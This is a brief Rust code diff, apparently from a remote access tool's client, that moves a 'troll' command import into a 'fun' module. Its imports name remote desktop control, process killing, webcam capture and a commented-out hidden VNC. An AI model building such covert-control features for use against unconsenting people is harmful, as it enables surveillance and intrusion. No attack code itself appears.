@@ -3,7 +3,7 @@ use crate::features::collectors::client_info;
 use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
 use crate::features::system_commands::system_commands;
-use crate::features::troll::execute_troll_command;
+use crate::features::fun::execute_troll_command;
 use crate::features::webcam::take_webcam;
 // use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use common::packets::*;
